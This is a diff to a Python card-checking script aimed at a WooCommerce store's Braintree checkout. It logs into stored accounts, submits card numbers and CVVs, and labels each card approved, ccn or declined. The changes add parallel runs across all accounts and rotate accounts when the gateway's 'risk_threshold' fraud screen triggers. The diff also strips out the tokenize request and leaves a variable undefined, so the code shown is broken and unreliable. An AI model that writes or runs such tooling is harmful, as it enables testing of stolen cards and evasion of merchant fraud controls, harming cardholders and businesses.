@@ -11,7 +11,8 @@ import json
 import re
 import threading
 import uuid
-from typing import Optional, Tuple
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from typing import Optional, Tuple, List
 
 import requests
 from bs4 import BeautifulSoup
@@ -184,6 +185,32 @@ def _parse_woo_errors(html: str) -> list[str]:
     return errs
 
 
+def _is_risk_threshold(msg: str) -> bool:
+    """True if response is risk_threshold / Gateway Rejected: risk_threshold (rotate account)."""
+    if not msg or not isinstance(msg, str):
+        return False
+    u = msg.lower()
+    return "risk_threshold" in u or "gateway rejected: risk_threshold" in u
+
+
+def _is_valid_braintree_response(res: dict) -> bool:
+    """
+    True if result is a proper card response (approved, CCN, declined).
+    False for HTTP/timeout/proxy/connection, risk_threshold, login/tokenize/add-payment errors.
+    """
+    status = (res or {}).get("status", "error")
+    if status not in ("approved", "ccn", "declined"):
+        return False
+    resp = (res or {}).get("response") or ""
+    u = resp.lower()
+    invalid = (
+        "risk_threshold" in u or "timeout" in u or "connection" in u or "proxy" in u
+        or "login failed" in u or "tokenize" in u or "no token" in u or "add payment" in u
+        or "request failed" in u or "login page" in u or "nonce" in u or "fingerprint" in u
+    )
+    return not invalid
+
+
 def _parse_status_code_response(html: str) -> Optional[str]:
     """Extract 'Status code XXXX: ...' from woocommerce-error li (prefix Status code, suffix </li>)."""
     m = re.search(r'woocommerce-error[\s\S]*?<li[^>]*>\s*(Status code[^<]*?)\s*</li>', html, re.I)
@@ -234,11 +261,12 @@ def run_iditarod_check(
     ano: str,
     cvv: str,
     proxy: Optional[str] = None,
+    fixed_account: Optional[Tuple[str, str]] = None,
 ) -> dict:
     """
     Full Iditarod Braintree flow: login -> add-payment-method -> tokenize -> submit.
     Returns {status, response} with status in approved|ccn|declined|error.
-    Retries with next account on login failure (up to 3 accounts).
+    If fixed_account is set, runs one attempt only; else rotates on login/risk_threshold.
     """
     if len(ano) == 4:
         ano = ano[2:]
@@ -252,23 +280,28 @@ def run_iditarod_check(
         kw["proxies"] = proxies
 
     last_error: dict = {"status": "error", "response": "Request failed"}
-    max_account_tries = min(3, len(IDITAROD_ACCOUNTS))
+    max_account_tries = 1 if fixed_account else len(IDITAROD_ACCOUNTS)
+    use_fixed = fixed_account is not None
 
     for _ in range(max_account_tries):
         session = requests.Session()
         session.trust_env = False
         session.headers.update(_default_headers())
         try:
-            email, password = _next_account()
+            email, password = fixed_account if use_fixed else _next_account()
 
             r = session.get(LOGIN_URL, **kw)
             if r.status_code != 200:
                 last_error = {"status": "error", "response": "Login page failed"}
+                if use_fixed:
+                    return last_error
                 continue
 
             login_nonce = _parse_login_nonce(r.text)
             if not login_nonce:
                 last_error = {"status": "error", "response": "Login nonce missing"}
+                if use_fixed:
+                    return last_error
                 continue
 
             login_data = {
@@ -284,6 +317,8 @@ def run_iditarod_check(
             r = session.post(LOGIN_URL, headers=h, data=login_data, **kw)
             if r.status_code != 200:
                 last_error = {"status": "error", "response": "Login request failed"}
+                if use_fixed:
+                    return last_error
                 continue
 
             low = r.text.lower()
@@ -293,15 +328,21 @@ def run_iditarod_check(
                     last_error = {"status": "error", "response": f"Login failed: {errs[0][:50]}"}
                 else:
                     last_error = {"status": "error", "response": "Login failed (check account)"}
+                if use_fixed:
+                    return last_error
                 continue
 
             r = session.get(EDIT_BILLING_URL, headers=_default_headers(referer=LOGIN_URL), **kw)
             if r.status_code != 200:
                 last_error = {"status": "error", "response": "Edit billing page failed"}
+                if use_fixed:
+                    return last_error
                 continue
             edit_nonce = _parse_edit_address_nonce(r.text)
             if not edit_nonce:
                 last_error = {"status": "error", "response": "Edit address nonce missing"}
+                if use_fixed:
+                    return last_error
                 continue
             billing_data = {
                 "billing_first_name": "Mass",
@@ -325,6 +366,8 @@ def run_iditarod_check(
             r = session.post(EDIT_BILLING_URL, headers=h, data=billing_data, **kw)
             if r.status_code != 200:
                 last_error = {"status": "error", "response": "Save billing failed"}
+                if use_fixed:
+                    return last_error
                 continue
 
             session.get(EDIT_ADDRESS_URL, headers=_default_headers(referer=EDIT_BILLING_URL), **kw)
@@ -363,54 +406,17 @@ def run_iditarod_check(
                 auth_fp = bt.get("authorizationFingerprint")
                 if not auth_fp:
                     return {"status": "error", "response": "No auth fingerprint"}
-            except Exception as e:
-                return {"status": "error", "response": f"Token decode error: {str(e)[:30]}"}
-
-            tokenize_payload = {
-                "clientSdkMetadata": {
-                    "source": "client",
-                    "integration": "custom",
-                    "sessionId": str(uuid.uuid4()),
-                },
-                "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 expirationMonth expirationYear binData { issuingBank countryOfIssuance } } } }",
-                "variables": {
-                    "input": {
-                        "creditCard": {
-                            "number": card,
-                            "expirationMonth": mes,
-                            "expirationYear": yy,
-                            "cvv": cvv,
-                        },
-                        "options": {"validate": False},
-                    }
-                },
-                "operationName": "TokenizeCreditCard",
-            }
-            bt_headers = {
-                "accept": "*/*",
-                "accept-language": "en-US,en;q=0.9",
-                "authorization": f"Bearer {auth_fp}",
-                "braintree-version": "2018-05-10",
-                "content-type": "application/json",
-                "origin": "https://assets.braintreegateway.com",
-                "referer": "https://assets.braintreegateway.com/",
-                "sec-fetch-dest": "empty",
-                "sec-fetch-mode": "cors",
-                "sec-fetch-site": "cross-site",
-                "user-agent": session.headers.get("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/144.0.0.0 Safari/537.36"),
-            }
-            r = session.post(BRAINTREE_GRAPHQL, headers=bt_headers, json=tokenize_payload, **kw)
-            if r.status_code != 200:
-                return {"status": "error", "response": "Tokenize request failed"}
-            try:
-                j = r.json()
-            except Exception:
-                return {"status": "error", "response": "Tokenize response not JSON"}
+ 
 
             errs = j.get("errors")
             if errs and isinstance(errs, list):
                 err = errs[0] if errs else {}
                 msg = err.get("message", "Unknown") if isinstance(err, dict) else str(err)
+                if _is_risk_threshold(msg):
+                    last_error = {"status": "error", "response": msg}
+                    if use_fixed:
+                        return last_error
+                    continue
                 st, resp = _map_response_to_status(msg)
                 return {"status": st, "response": resp}
 
@@ -457,11 +463,21 @@ def run_iditarod_check(
 
             status_code_msg = _parse_status_code_response(txt)
             if status_code_msg:
+                if _is_risk_threshold(status_code_msg):
+                    last_error = {"status": "error", "response": status_code_msg}
+                    if use_fixed:
+                        return last_error
+                    continue
                 st, _ = _map_response_to_status(status_code_msg)
                 return {"status": st, "response": status_code_msg}
             errs = _parse_woo_errors(txt)
             if errs:
                 raw = " ".join(errs)
+                if _is_risk_threshold(raw):
+                    last_error = {"status": "error", "response": raw}
+                    if use_fixed:
+                        return last_error
+                    continue
                 st, _ = _map_response_to_status(raw)
                 return {"status": st, "response": raw}
 
@@ -485,3 +501,53 @@ def run_iditarod_check(
                 pass
 
     return last_error
+
+
+_BT_PARALLEL_EXECUTOR: Optional[ThreadPoolExecutor] = None
+
+
+def _get_bt_executor() -> ThreadPoolExecutor:
+    global _BT_PARALLEL_EXECUTOR
+    if _BT_PARALLEL_EXECUTOR is None:
+        _BT_PARALLEL_EXECUTOR = ThreadPoolExecutor(max_workers=len(IDITAROD_ACCOUNTS))
+    return _BT_PARALLEL_EXECUTOR
+
+
+def run_iditarod_check_parallel(
+    card: str,
+    mes: str,
+    ano: str,
+    cvv: str,
+    proxy: Optional[str] = None,
+) -> dict:
+    """
+    Run Iditarod Braintree check across all accounts in parallel (multi-thread).
+    Returns first non-risk_threshold result; if all risk_threshold, returns last.
+    """
+    accounts: List[Tuple[str, str]] = [(e, IDITAROD_PASSWORD) for e in IDITAROD_ACCOUNTS]
+    executor = _get_bt_executor()
+    future_list = [
+        executor.submit(
+            run_iditarod_check,
+            card,
+            mes,
+            ano,
+            cvv,
+            proxy,
+            fixed_account=(email, password),
+        )
+        for email, password in accounts
+    ]
+    last_result: dict = {"status": "error", "response": "Request failed"}
+    for fut in as_completed(future_list):
+        try:
+            res = fut.result()
+        except Exception as e:
+            res = {"status": "error", "response": str(e)[:50]}
+        last_result = res
+        if _is_valid_braintree_response(res):
+            for o in future_list:
+                if o is not fut and not o.done():
+                    o.cancel()
+            return res
+    return last_result
